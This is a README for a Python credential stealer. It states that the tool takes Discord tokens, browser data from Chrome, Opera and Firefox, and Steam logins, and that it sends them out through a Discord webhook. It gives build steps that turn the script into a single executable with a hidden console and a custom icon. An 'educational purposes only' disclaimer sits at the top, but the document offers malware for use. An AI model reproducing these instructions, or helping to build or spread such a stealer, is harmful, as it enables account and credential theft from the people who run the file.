# _**Gromix Python Stealer**_
### _DISCLAIMER: This program is for educational purposes only._

## What data can it steal ?
- Discord tokens
- Google Chrome
- Opera
- Firefox
- Steam login / installed apps

## Features
- [x] Build using Nuitka
- [x] Send all data by Discord webhooks.
- [x] Custom ico

## How to build

Just put your Discord webhook inside _webhook.txt_ file then:
```
python build.py
```
After that our exe file will start to generate.

I build this on Python 3.10, final .exe file size is **28717 KB**

If you're having troubles with _build.py_ script, just edit constant inside _utils.py_:
```
WEBHOOK = "https://discord.com/api/webhooks/2281488/something"
```
Then, execute this command:
```
python -m nuitka --standalone --onefile --disable-console --windows-icon-from-ico=icon.ico stealer.py
```